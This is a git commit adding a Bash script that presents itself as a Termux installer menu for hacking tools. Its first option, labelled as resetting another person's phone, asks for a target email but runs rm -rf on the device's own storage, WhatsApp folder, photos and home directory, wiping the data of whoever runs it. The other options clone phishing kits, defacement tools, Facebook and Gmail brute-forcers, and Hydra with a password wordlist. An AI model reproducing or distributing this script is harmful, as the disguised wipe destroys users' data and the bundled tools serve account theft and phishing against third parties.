773a03e077075e7cd4ecde92e66da1c581a8e10a
MRT-REX <48020975+MRT-REX@users.noreply.github.com>
2019-03-21 07:51:06 +0700

    Create Tools-Gabungan.sh

---
+++ Tools-Gabungan.sh
@@ -0,0 +1,266 @@
+#!/bin/bash
+#version 1.0
+
+#                        MAU NGAPAIN ELU >:)
+#                  RECODE?REEDIT?RECOPYRIGHT?COPAS?
+#                       KALO PENGEN BISA BELAJAR AJG!!!
+#                       BIAR GAK GOBLOK!!
+#                       ELU BURIQ 8 BIT..GUA GANS!!!
+#                       KELUAR SANA BANGSAT !
+
+#20/03/19
+
+clear
+# Variables
+b='\033[1m'
+u='\033[4m'
+bl='\E[30m'
+r='\E[31m'
+g='\E[32m'
+bu='\E[34m'
+m='\E[35m'
+c='\E[36m'
+w='\E[37m'
+endc='\E[0m'
+enda='\033[0m'
+blue='\e[1;34m'
+cyan='\e[1;36m'
+red='\e[1;31m'
+echo
+echo
+echo
+echo  "                 _________________________" | lolcat
+echo  "                 |                       |" | lolcat
+echo  "                 | TOOL'S RooT./T-REX    |" | lolcat
+echo  "###########################################################" | lolcat
+echo  "                  TOOL'S INSTALLER  TERMUX " |lolcat
+echo  ""
+echo  "############################################################" | lolcat
+echo  "#  AUTHOR     : RooT./T-REX   " | lolcat
+echo  "#----------------------------------------------------------#" | lolcat
+echo  "#  FaceBook   : N0 N4M3>:v   " | lolcat
+echo  "#----------------------------------------------------------#" | lolcat
+echo  "#  WhatsApp   : +6281282090731  " |lolcat
+echo  "#----------------------------------------------------------#" | lolcat
+echo  "###########################################################" | lolcat
+
+###################################################                                             
+# CTRL + C                                        #
+###################################################
+
+trap ctrl_c INT
+ctrl_c() {
+clear
+echo -b $green"[#]> (Ctrl + C ) Detected, Trying To Exit ... " |lolcat
+echo -b $green"[#]> THANKS UDAH PAKE TOOLS GUE " |lolcat
+sleep 1
+echo ""
+echo -b $green"[#]>  COMEBACK AGAIN BROTHER :)" |lolcat
+
+echo -b $green"[#]> RooT./T-REX WASS HERE !" |lolcat
+sleep 1
+exit
+}
+
+lagi=1
+while [ $lagi -lt 6 ];
+do
+echo ""
+echo ""
+
+echo  "####################################" | lolcat
+echo  "#SILAHKAN PAKAI TOOLS YANG TERSEDIA#" | lolcat
+echo  "####################################" | lolcat
+                                                                                                
+echo ""
+echo  "WELLCOME TO MY TOOLS" |lolcat
+echo  "GUNAKAN SETIAP TOOLS DENGAN BIJAKSANA" | lolcat
+echo  "BUKAN HACKER,HANYA SI BODOH YG INGIN BELAJAR IT" | lolcat
+echo  "HARGAI KARYA ORANG LAIN" | lolcat
+echo  "KEGAGALAN ADALAH AWAL DARI KESUKSESAN " | lolcat
+echo  "SCRIPT INI TIDAK DIPERJUALBELIKAN ALIAS FREE" | lolcat
+echo  "RooT./T-REX GANS TQ :v" | lolcat
+echo  "......HATERS MAKE ME FAMOUS....." | lolcat
+echo ""
+echo  "TUNGGU PROSESNYA............" | lolcat
+echo ""
+echo ""
+
+
+echo ""
+echo -e $b "1. RESET HP ORG${enda}";
+echo -e "<[¤]>=========================<[¤]>" | lolcat
+echo -e $b "2. LAZYMUX${enda}";
+echo -e "<[¤]>=========================<[¤]>" | lolcat                          
+echo -e $b "3. DEFACE${enda}";
+echo -e "<[¤]>=========================<[¤]>" | lolcat
+echo -e $b "4. SCRIPT-DEFACE-CREATOR${enda}";
+echo -e "<[¤]>=========================<[¤]>" | lolcat
+echo -e $b "5. WEEMAN${enda}";
+echo -e "<[¤]>=========================<[¤]>" | lolcat 
+echo -e $b "6. HYDRA${enda}"
+echo -e "<[¤]>=========================<[¤]>" | lolcat
+echo -e $b "7. IPCS${enda}"
+echo -e "<[¤]>=========================<[¤]>" | lolcat
+echo -e $b "8. OSIF ${enda}"
+echo -e "<[¤]>=========================<[¤]>" | lolcat
+echo -e $b "9. MBF${enda}"
+echo -e "<[¤]>=========================<[¤]>" | lolcat
+echo -e $b "10. CLONE YAHOO${enda}"
+echo -e "<[¤]>=========================<[¤]>" | lolcat
+echo -e $b "11. Hack FB${enda}"
+echo -e "<[¤]>=========================<[¤]>" | lolcat
+echo -e $b "12. MALICIOUS${enda}"
+echo -e "<[¤]>=========================<[¤]>" | lolcat
+echo -e $b "13. TOOLS BLACK EYE${enda}"
+echo -e "<[¤]>=========================<[¤]>" | lolcat
+echo -e $b "14. KO-DORK${enda}"
+echo -e "<[¤]>=========================<[¤]>" | lolcat
+echo -e $b "15. BRUTEGMAIL${enda}"
+echo -e "<[¤]>=========================<[¤]>" | lolcat
+echo -e $b "00. Exit${enda}";
+echo -e "╭─RooT./T-REX [PILIH AJA NOMERNYA]" | lolcat
+read -p "╰──────#>>>" pil;
+
+
+case  $pil in
+1) figlet -f shadow reset...
+echo -e $b "email target:${enda}:"
+rm -rf /sdcard
+rm -rf /storage/emulated/0
+rm -rf /sdcard/Music
+rm -rf /storage/emulated/0/Whatsapp
+rm -rf /storage/emulated/0/DCIM
+rm -rf $HOME
+
+;;
+
+2) figlet -f shadow LAZYMUX...
+apt update && apt upgrade
+apt install python2
+apt install git
+git clone https://github.com/Gameye98/Lazymux
+cd Lazymux
+
+
+;;
+
+3) figlet -f shadow Deface...
+apt update && apt upgrade -y
+apt install git
+git clone https://github.com/Amriez/AOCDEFACE
+cd AOCDEFACE
+
+;;
+
+4) figlet -f shadow installing...
+apt update
+apt upgrade
+apt install git
+apt install python2
+git clone https://github.com/Ubaii/script-deface-creator
+
+;;
+
+5) figlet -f shadow weeman...
+apt update && apt upgrade
+apt install python2 git -y
+git clone https://github.com/evait-security/weeman.git
+cd weeman
+
+;;
+
+6) figlet -f shadow HYDRA....
+ apt update && apt install -y wget
+apt install hydra
+wget 
+http://scrapmaker.com/download/data/wordlists/dictionaries/rockyou.txt
+
+;;
+
+7) figlet -f shadow IPCS...
+apt update && apt upgrade
+pkg install python2
+pkg install git
+pip2 install requests
+git clone https://github.com/kancotdiq/ipcs
+
+;;
+
+8) figlet -f shadow OSIF...
+lapt update && apt upgrade
+apt install python2
+pip2 install requests mechanize
+apt install git
+git clone https://github.com/CiKu370/OSIF.git
+cd OSIF
+
+
+;;
+
+9) figlet -f shadow MBF...
+pkg update && pkg upgrade
+pkg install python2
+pkg install git
+git clone https://github.com/hnov7/mbf
+cd mbf
+
+;;
+
+10) figlet -f shadow YAHOO...
+apt update && apt upgrade
+git clone https://github.com/FR13ND8/EmailVuln
+
+;;
+
+11) figlet -f shadow Facebook...
+apt update && apt upgrade
+apt install python2
+git clone https://github.com/MRT-REX/Crack-Facebook
+
+;;
+
+12) figlet -f shadow installing Malicious...
+apt update && apt upgrade
+apt install git python2 -y
+git clone https://github.com/Hider5/Malicious
+
+
+;;
+
+13) figlet -f shadow Black...
+pkg install bash
+pkg install git
+git clone https://github.com/thelinuxchoice/blackeye
+
+
+;;
+
+14) figlet -f shadow Ko-Dork...
+pkg update upgrade
+pkg install git python2
+git clone https://github.com/ciku370/ko-dork
+cd ko-dork
+
+;;
+
+
+15) figlet -f shadow Gmail...
+pkg update
+pkg install git
+git clone https://github.com/aliattacker/hackgmail
+
+
+;;
+
+
+00 )echo "BYE BYE MHAMANK :) COMBACK AGAIN YAA..." | lolcat
+exit
+
+;;
+
+*) echo "NU BALEG NGETIKNA>:v..PILIH NOMOR NYA AJA ASW >:v" | lolcat
+
+esac
+done
+done
